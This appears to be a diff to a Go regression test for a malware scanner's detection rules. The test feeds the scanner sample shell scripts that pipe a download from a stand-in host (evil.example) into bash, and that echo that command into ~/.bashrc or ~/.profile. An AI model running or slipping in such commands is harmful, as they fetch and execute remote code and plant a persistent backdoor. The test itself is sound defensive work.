@@ -182,18 +182,26 @@ func TestFPFlood_MarkdownProseDoesNotSuppressShellCommand(t *testing.T) {
 		}
 	}
 
+	// backdoor_bashrc_injection only claims a download-and-pipe as an rc
+	// backdoor when a shell startup file is involved; without one the finding
+	// belongs to dropper_wget_pipe_exec alone. Each rule is therefore given the
+	// shape it is responsible for, and both must survive the Markdown prose.
 	malicious := []byte("#!/bin/bash\n# See [docs](https://example.test)\ncurl -s http://evil.example/x.sh | bash\n")
-	for _, rule := range []string{"dropper_wget_pipe_exec", "backdoor_bashrc_injection"} {
-		if !hasYaraRule(s.ScanBytes(malicious), rule) {
-			t.Errorf("%s regression: unrelated Markdown prose suppressed a shell command", rule)
-		}
+	if !hasYaraRule(s.ScanBytes(malicious), "dropper_wget_pipe_exec") {
+		t.Error("dropper_wget_pipe_exec regression: unrelated Markdown prose suppressed a shell command")
+	}
+	maliciousRC := []byte("#!/bin/bash\n# See [docs](https://example.test)\necho 'curl -s http://evil.example/x.sh | bash' >> ~/.bashrc\n")
+	if !hasYaraRule(s.ScanBytes(maliciousRC), "backdoor_bashrc_injection") {
+		t.Error("backdoor_bashrc_injection regression: unrelated Markdown prose suppressed an rc injection")
 	}
 
 	fence := string([]byte{96, 96, 96})
 	mixed := []byte(fence + "\ncurl -s https://example.test/install.sh | sh\n" + fence + "\ncurl -s http://evil.example/x.sh | bash\n")
-	for _, rule := range []string{"dropper_wget_pipe_exec", "backdoor_bashrc_injection"} {
-		if !hasYaraRule(s.ScanBytes(mixed), rule) {
-			t.Errorf("%s regression: fenced documentation suppressed an unfenced shell command", rule)
-		}
+	if !hasYaraRule(s.ScanBytes(mixed), "dropper_wget_pipe_exec") {
+		t.Error("dropper_wget_pipe_exec regression: fenced documentation suppressed an unfenced shell command")
+	}
+	mixedRC := []byte(fence + "\ncurl -s https://example.test/install.sh | sh\n" + fence + "\necho 'curl -s http://evil.example/x.sh | bash' >> ~/.profile\n")
+	if !hasYaraRule(s.ScanBytes(mixedRC), "backdoor_bashrc_injection") {
+		t.Error("backdoor_bashrc_injection regression: fenced documentation suppressed an unfenced rc injection")
 	}
 }
